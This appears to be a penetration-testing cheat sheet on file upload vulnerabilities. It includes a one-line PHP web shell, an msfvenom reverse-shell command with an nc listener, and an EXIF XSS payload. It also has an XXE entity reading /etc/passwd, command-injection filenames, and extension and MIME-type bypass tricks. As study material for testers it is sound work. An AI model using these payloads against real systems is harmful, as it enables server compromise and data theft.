# File Upload Attacks
## 1. Web Shells & Reverse Shells
The primary goal of unrestricted file upload is to execute code on the server.
- **Web Shells:** Scripts that provide a web interface for executing system commands.
    - **Simple PHP Shell:** 
	```php
	<?php system($_REQUEST['cmd']); ?>
	```
	- **Usage:** Upload `shell.php` and access `http://target/uploads/shell.php?cmd=id`.
    - **Resources:** `phpbash` (terminal-like) and SecLists (`/opt/useful/seclists/Web-Shells`).
- **Reverse Shells:** Scripts that initiate a connection back to the attacker's machine, providing an interactive shell.
    - **PentestMonkey PHP Reverse Shell:** A robust standard. Modify `$ip` and `$port`.
    - **Generation:** 
	```shell
	msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > reverse.php
	```
    - **Execution:** Start a listener (`nc -lvnp <PORT>`), upload the script, and access it.
## 2. Client-Side Validation Bypass
Client-side checks are insecure and easily circumvented.
- **Burp Suite Modification:**
    1. Capture the upload request for a valid file (e.g., `image.png`).
    2. Modify `filename="image.png"` to `filename="shell.php"`.
    3. Replace the file content with the malicious script.
- **Browser Manipulation:**
    - Inspect the upload button (`Ctrl+Shift+C`).
    - Remove `accept=".jpg,.png"` attributes.
    - Delete or modify JavaScript validation functions (e.g., `onchange="checkFile(this)"`) via the Console or Inspector.
## 3. Blacklist Bypass
If the server blocks specific extensions (e.g., `.php`), look for alternatives.
- **Fuzzing Extensions:** Use Burp Intruder to test a list of extensions (e.g., SecLists `web-extensions.txt`).
    - Target `filename="shell.§php§"`.
    - Uncheck "URL Encoding".
- **Alternative Extensions:**
    - **PHP:** `.phtml`, `.php3`, `.php4`, `.php5`, `.phps`.
    - **ASP:** `.aspx`, `.asp`, `.cer`, `.asa`.
- **Case Sensitivity:** Try mixed case if the server is Windows (e.g., `.pHp`).
## 4. Whitelist Bypass
If the server only allows specific extensions (e.g., `.jpg`), trick the parser.
- **Double Extensions:**
    - `shell.jpg.php` (may bypass regex checks).
    - `shell.php.jpg` (relies on web server misconfiguration mapping `.php` anywhere in the name).
- **Character Injection:** Inject characters to confuse the validation logic.
    - `shell.php%00.jpg` (Null Byte truncation in older PHP).
    - `shell.aspx:.jpg` (NTFS Alternate Data Streams).
    - `shell.php%20`, `shell.php.`, `shell.php/`.
## 5. Content-Type & MIME-Type Bypass
Servers may check the file's declared type or magic bytes.
- **Content-Type Header:**
    - Capture the request in Burp.
    - Change `Content-Type: application/x-php` to `Content-Type: image/jpeg`.
- **MIME-Type (Magic Bytes):**
    - Add magic bytes to the start of the script to mimic a valid file.
    - **GIF:** Add `GIF8` or `GIF89a` at the very top of `shell.php`.
    - Result: `file shell.php` identifies it as `GIF image data`, but the server executes the PHP code following it.
## 6. Limited File Uploads (XSS & XXE)
If code execution is impossible, upload vulnerabilities can still lead to other attacks.
- **XSS (Metadata):** Inject payloads into image metadata (e.g., EXIF comment).
```shell
exiftool -Comment='"><script>alert(1)</script>' image.jpg
```
- **XSS (SVG):** Upload an SVG file containing a `<script>` tag.
- **XXE (SVG/XML):** Upload an SVG defining an external entity to read local files.
	```shell
	<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	```
    - Can be used to read source code (via PHP filters) to find upload directories.
## 7. Other Techniques
- **Command Injection in Filename:** `file$(whoami).jpg` might execute if the server processes filenames via shell commands.
- **SQL Injection in Filename:** `file'sleep(10).jpg`.
- **Windows-Specific:**
    - Reserved names (`CON`, `NUL`) to cause errors.
    - 8.3 Filename Convention (`HAC~1.TXT`) to overwrite existing files.
- **Directory Disclosure:** Force errors (duplicate names, overly long names) to reveal the upload path.